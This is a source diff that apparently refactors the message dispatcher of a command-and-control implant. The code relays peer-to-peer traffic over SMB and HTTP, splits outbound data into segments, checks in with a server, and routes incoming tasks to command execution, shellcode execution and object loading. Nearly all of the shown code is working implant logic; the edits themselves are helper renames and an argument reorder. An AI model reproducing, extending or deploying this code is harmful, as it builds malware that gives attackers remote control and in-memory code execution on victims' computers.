@@ -1,8 +1,9 @@
-#include <include/dispatch.hpp>
+#include <core/include/dispatch.hpp>
+
 using namespace Utils;
+using namespace Peers;
 using namespace Stream;
 using namespace Parser;
-using namespace Clients;
 using namespace Network::Smb;
 using namespace Network::Http;
 using namespace Memory::Execute;
@@ -63,14 +64,14 @@ namespace Dispatcher {
             CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
             queue            = CreateStream();
-            queue->peer_id   = __builtin_bswap32(UnpackDword(&parser));
-            queue->task_id   = __builtin_bswap32(UnpackDword(&parser));
-            queue->msg_type  = __builtin_bswap32(UnpackDword(&parser));
+            queue->peer_id   = __builtin_bswap32(UnpackUint32(&parser));
+            queue->task_id   = __builtin_bswap32(UnpackUint32(&parser));
+            queue->msg_type  = __builtin_bswap32(UnpackUint32(&parser));
 
             queue->length   = parser.Length;
-            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
+            queue->buffer   = B_PTR(Realloc(queue->buffer, queue->length));
 
-            x_memcpy(queue->buffer, parser.buffer, queue->length);
+            MemCopy(queue->buffer, parser.buffer, queue->length);
             AddMessage(queue);
 
             DestroyParser(&parser);
@@ -92,18 +93,18 @@ namespace Dispatcher {
 
         while (length > 0) {
             cb_seg  = length > m_max ? m_max : length;
-            queue   = (_stream*) x_malloc(cb_seg + SEGMENT_HEADER_SIZE);
+            queue   = (_stream*) Malloc(cb_seg + SEGMENT_HEADER_SIZE);
 
-            x_memcpy(&peer_id, buffer, 4);
-            x_memcpy(&task_id, buffer + 4, 4);
+            MemCopy(&peer_id, buffer, 4);
+            MemCopy(&task_id, buffer + 4, 4);
 
             queue->peer_id    = peer_id;
             queue->task_id    = task_id;
             queue->msg_type   = TypeSegment;
 
-            PackDword(queue, index);
-            PackDword(queue, n_seg);
-            PackDword(queue, cb_seg);
+            PackUint32(queue, index);
+            PackUint32(queue, n_seg);
+            PackUint32(queue, cb_seg);
             PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
 
             length -= cb_seg;
@@ -122,9 +123,9 @@ namespace Dispatcher {
             if (head->buffer) {
                 CreateParser(&parser, B_PTR(head->buffer), head->length);
 
-                PackDword(out, head->peer_id);
-                PackDword(out, head->task_id);
-                PackDword(out, head->msg_type);
+                PackUint32(out, head->peer_id);
+                PackUint32(out, head->task_id);
+                PackUint32(out, head->msg_type);
 
                 if (ROOT_NODE) {
                     PackBytes(out, B_PTR(head->buffer), head->length);
@@ -177,7 +178,7 @@ namespace Dispatcher {
         PrepareEgress(out);
 
         if (ROOT_NODE) {
-            if (!HttpCallback(out, &in)) {
+            if (!HttpCallback(&in, out)) {
                 return false;
             }
         }
@@ -200,13 +201,13 @@ namespace Dispatcher {
         _parser parser = { };
 
         CreateParser(&parser, B_PTR(in->buffer), in->length);
-        UnpackDword(&parser);
+        UnpackUint32(&parser);
 
-        auto task_id = UnpackDword(&parser);
-        x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
+        auto task_id = UnpackUint32(&parser);
+        MemCopy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
-        switch (UnpackDword(&parser)) {
-            case TypeCheckin:   x_memset(&Ctx->session.checkin, true, sizeof(bool)); break;
+        switch (UnpackUint32(&parser)) {
+            case TypeCheckin:   MemSet(&Ctx->session.checkin, true, sizeof(bool)); break;
             case TypeTasking:   ExecuteCommand(parser); break;
             case TypeExecute:   ExecuteShellcode(parser); break;
             case TypeObject:    LoadObject(parser); break;
